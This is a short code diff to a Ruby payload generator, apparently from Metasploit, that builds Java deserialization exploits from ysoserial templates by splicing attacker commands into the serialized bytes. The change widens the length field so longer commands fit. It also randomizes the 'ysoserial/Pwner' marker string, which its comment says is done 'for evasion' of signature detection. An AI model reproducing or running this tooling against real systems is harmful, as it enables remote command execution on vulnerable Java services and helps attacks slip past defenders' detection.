@@ -6,7 +6,6 @@ require 'base64'
 
 PAYLOAD_FILENAME="ysoserial_payloads.json"
 
-#TODO: Randomize bytes which could be signatured (ysoserial/Pwner000000000000000)
 #TODO: Support ysoserial alongside ysoserial-modified payloads (including cmd, bash, powershell, none)
 
 class Java_deserialization
@@ -43,15 +42,18 @@ class Java_deserialization
       bufferOffset  = payload['bufferOffset'].first   #TODO: Do we ever need to support multiple buffers?
       bytes[bufferOffset-1] += command
 
-      # Overwrite lengthOffset (multiple times, if necessary)
+      # Overwrite length (multiple times, if necessary)
       lengthOffsets = payload['lengthOffset']
       lengthOffsets.each do |lengthOffset|
-        #TODO: Handle command strings >255 chars
-        raise RuntimeError, "Command buffer too large" if bytes[lengthOffset].ord + command.length > 255
-        bytes[lengthOffset] = (bytes[lengthOffset].ord + command.length.ord).chr
+        # Extract length as a 16-bit unsigned int, then add 
+        length  = bytes[lengthOffset-1..lengthOffset].unpack("n").first
+        length += command.length.ord
+        length  = [length].pack("n")
+        bytes[lengthOffset-1..lengthOffset] = length
       end
 
-      # TODO: Randomize "ysoserial/Pwner00000000000000"
+      # Replace "ysoserial\/Pwner" timestamp string with randomness for evasion
+      bytes.gsub!(/ysoserial\/Pwner00000000000000/, Rex::Text.rand_text_alphanumeric(29))
       return bytes
     else 
       raise RuntimeError, "Malformed JSON file"
